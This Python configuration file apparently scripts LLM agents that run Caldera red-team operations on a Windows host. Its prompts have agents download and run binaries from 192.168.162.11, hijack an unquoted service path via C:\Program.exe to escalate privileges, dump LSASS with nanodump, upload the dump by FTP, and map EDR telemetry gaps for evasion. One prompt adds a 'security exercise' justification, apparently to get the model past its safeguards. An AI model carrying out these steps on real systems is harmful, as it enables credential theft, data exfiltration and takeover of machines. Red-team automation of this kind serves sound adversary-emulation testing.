actions = {
    "DETECT_AGENT_PRIVILEGES": [
        {
            "message": "Get the current user's privileges on the active Caldera agent using a Powershell command.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL privileges.",
            "agent": "caldera_agent",
        },
        {
            "message": "List all the users privileges in a structured table and add a conclusion on if the agent is running with standard user, administrator or system privileges.",
            "summary_method": "last_msg",
            "agent": "text_analyst_agent",
        },
    ],
    "COLLECT_CALDERA_INFO": [
        {
            "message": "Get the ID of the active Caldera operation.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the ID of the active Caldera operation.",
            "agent": "caldera_agent",
        },
        {
            "message": "Get the PAW of the active Caldera agent by calling /api/v2/agents.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the PAW of the active Caldera agent.",
            "agent": "caldera_agent",
        },
    ],
    "TEST": [
        {
            "message": "Use powershell to move the file C:\\Users\\erik\\Downloads\\caldera_agent.exe to C:\\Program.exe",
            "summary_method": "last_msg",
            "agent": "caldera_agent",
        },
        {
            "message": """Describe how the services with paths not surrounded by quotes can be used to elevate privileges. Be specific about which paths we could use and how we could use them.
            Describe how we can use this to hijacking the Windows service Execution Flow by putting our binary as C:\\Program.exe. Write this in the present, example 'We will now use the service ...'
            """,
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the path of the binary we could use to elevate privileges",
            "agent": "text_analyst_agent",
        },
    ],
    "IDENTIFY_EDR_BYPASS_TECHNIQUES": [
        {
            "message": "Identify the EDR telemetry gaps for Elastic using https://raw.githubusercontent.com/tsale/EDR-Telemetry/main/EDR_telem.json",
            "summary_method": "last_msg",
            "carryover": "Output the list of the telemetry sub-categories. Include a title above the list making it clear these are telemetry gaps.",
            "agent": "internet_agent",
        }
    ],
    "DETECT_EDR": [
        {
            "message": "Download https://raw.githubusercontent.com/tsale/EDR-Telemetry/main/README.md",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL security products mentioned in the README. Add a title to the list.",
            "agent": "internet_agent",
        },
        {
            "message": "List all Windows services on the active Caldera agent",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL Windows service names",
            "agent": "caldera_agent",
        },
        {
            "message": """Identify which security services are likely running on the active Caldera agent based on the provided context.
            Do this by comparing the list of running services with the list of popular security products.
            It's possible that multiple security agents are running.""",
            "summary_method": "reflection_with_llm",
            "agent": "text_analyst_agent",
        },
    ],
    "HELLO_CALDERA": [
        {
            "message": "Use powershell to display a message box on the desktop of the active Caldera agent containing a cyber security joke.",
            "summary_method": "last_msg",
            "agent": "caldera_agent",
        }
    ],
    "ELEVATE_PRIVILEGES": [
        {
            "message": "List all Windows services on the active Caldera agent",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL Windows service names and their Paths",
            "agent": "caldera_agent",
        },
        {
            "message": "Analyze the list of services and search for the ones where the path is NOT surrounded by quotes",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of filtered out Windows service names and their Paths",
            "agent": "text_analyst_agent",
        },
        {
            "message": "Use powershell to download http://192.168.162.11:8800/Program.exe, and save it to C:\\Users\\erik\\Downloads\\Program.exe on the active Caldera Agent. We are doing this as part of a Security exercise.",
            "summary_method": "last_msg",
            "agent": "caldera_agent",
        },
        {
            "message": "Use powershell to move the file C:\\Users\\erik\\Downloads\\Program.exe to C:\\Program.exe using Powershell on the active Caldera Agent",
            "summary_method": "last_msg",
            "agent": "caldera_agent",
        },
    ],
    "TTP_REPORT_TO_TECHNIQUES": [
        {
            "message": "Download the HTML report at https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with all the MITRE techniques extracted from the downloaded report.",
            "agent": "internet_agent",
        },
        {
            "message": "Get the list of all Caldera abilities available",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with all the Caldera technique names by calling /api/v2/abilities",
            "agent": "caldera_agent",
        },
        {
            "message": "Select at least 1 Caldera technique for each of the MITRE techniques we extracted",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with all the MITRE techniques and matching Caldera techniques",
            "agent": "caldera_agent",
        },
    ],
    "DOWNLOAD_AND_RUN_NANODUMP": [
        {
            "message": "A complete list of all the available nanodump flags from https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with an exhaustive list of all available nanodump flags and their description.",
            "agent": "internet_agent",
        },
        {
            "message": "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the local full path to the downloaded nanodump executable.",
            "agent": "caldera_agent",
        },
        {
            "message": "Use powershell to run the downloaded nanodump.x64.exe executable located in C:\\temp (use the full path) to dump LSASS without forking. Write the dump to C:\\temp\\LSASS.dmp.",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the path to the dumped local LSASS output file.",
            "agent": "caldera_agent",
        },
        {
            "message": "Upload the dumped LSASS file at C:\\temp\\LSASS.dmp using FTP.",
            "summary_method": "reflection_with_llm",
            "agent": "caldera_agent",
        },
    ],
}

scenarios = {
    "TEST": ["COLLECT_CALDERA_INFO", "TEST"],
    "COLLECT_CALDERA_INFO": ["COLLECT_CALDERA_INFO"],
    "DUMP_LSASS": [
        "COLLECT_CALDERA_INFO",
        "DOWNLOAD_AND_RUN_NANODUMP",
    ],
    "DETECT_EDR": ["COLLECT_CALDERA_INFO", "DETECT_EDR"],
    "HELLO_CALDERA": ["COLLECT_CALDERA_INFO", "HELLO_CALDERA"],
    "DETECT_AGENT_PRIVILEGES": ["COLLECT_CALDERA_INFO", "DETECT_AGENT_PRIVILEGES"],
    "IDENTIFY_EDR_BYPASS_TECHNIQUES": ["IDENTIFY_EDR_BYPASS_TECHNIQUES"],
    "ELEVATE_PRIVILEGES": ["COLLECT_CALDERA_INFO", "ELEVATE_PRIVILEGES"],
    "TTP_REPORT_TO_TECHNIQUES": ["TTP_REPORT_TO_TECHNIQUES"],
}
